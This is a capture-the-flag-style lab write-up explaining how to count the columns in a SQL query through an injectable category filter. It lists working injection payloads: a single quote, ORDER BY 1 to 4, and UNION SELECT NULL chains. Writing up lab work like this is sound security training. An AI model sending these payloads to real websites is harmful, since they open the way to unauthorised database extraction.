# 🧪 Lab Write-up: SQL Injection UNION Attack – Determining Number of Columns

## 📌 Lab Overview

This lab contains a **SQL injection vulnerability** in the product category filter.

* The query results are reflected in the response.
* This allows the use of a **UNION-based SQL injection**.
* Before extracting data, you must determine the **number of columns** returned by the original query.

<img width="995" height="493" alt="1 lab" src="https://github.com/user-attachments/assets/5ddd845b-3c6d-479f-aa79-6ee43d040105" />

---

## 🎯 Objective

Determine how many columns are returned by the query using:

* `ORDER BY` technique
* `UNION SELECT NULL` technique

---

## 🚶 Step-by-Step Exploitation

### 1. Identify the Vulnerability

Modify the category parameter in the URL:

```bash
/filter?category='
```

✅ Result:

* Application returns **Internal Server Error**

💡 This indicates the input is not properly sanitized → possible SQL injection.

<img width="941" height="346" alt="2 check-sqli" src="https://github.com/user-attachments/assets/3e12bd0a-1489-48be-a2b9-7f002427bde8" />

---

## 🔍 Method 1: Using ORDER BY

### 2. Test Column Count with ORDER BY

Start incrementing:

```bash
/filter?category=' ORDER BY 1--
/filter?category=' ORDER BY 2--
/filter?category=' ORDER BY 3--
```

✅ These return normal responses.

Now test further:

```bash
/filter?category=' ORDER BY 4--
```

❌ This causes an error.

<img width="1071" height="376" alt="3 first-method-OrderBy" src="https://github.com/user-attachments/assets/15fcf70f-5cb3-485e-8dcb-cb567d0e31b3" />

---

### 🧠 Conclusion (Method 1)

* The query supports **3 columns**
* Because:

  * `ORDER BY 3` works ✅
  * `ORDER BY 4` fails ❌

---

## 🔍 Method 2: Using UNION SELECT NULL

Even though we know it's 3 columns, the lab requires confirming it via UNION.

---

### 3. Try UNION with Increasing NULLs

Start testing:

```bash
/filter?category=' UNION SELECT NULL--
```

❌ Error

```bash
/filter?category=' UNION SELECT NULL,NULL--
```

❌ Error

```bash
/filter?category=' UNION SELECT NULL,NULL,NULL--
```

🎉 Success (response is reflected)

<img width="1075" height="552" alt="4 NULL-Method" src="https://github.com/user-attachments/assets/51613db1-b3d9-4578-a30c-e74579ddc93b" />

---

### 🧠 Why NULL?

* `NULL` is compatible with most data types
* Helps avoid type mismatch errors
* Ideal for probing column structure

---

## 🧠 Key Concepts Explained

### 🔹 UNION Operator

* Combines results from two SELECT queries
* Requires:

  * Same number of columns
  * Compatible data types

---

### 🔹 ORDER BY Trick

* Helps identify column count by incrementing index
* Error indicates column limit exceeded

---

### 🔹 NULL Usage

* Safe placeholder for unknown column types
* Prevents datatype conflicts during UNION

---

## 🔐 Key Takeaways

* Always determine column count before a UNION attack
* Use:

  * `ORDER BY` → quick estimation
  * `UNION SELECT NULL` → confirmation
* Understanding this step is critical for **data extraction in later labs**

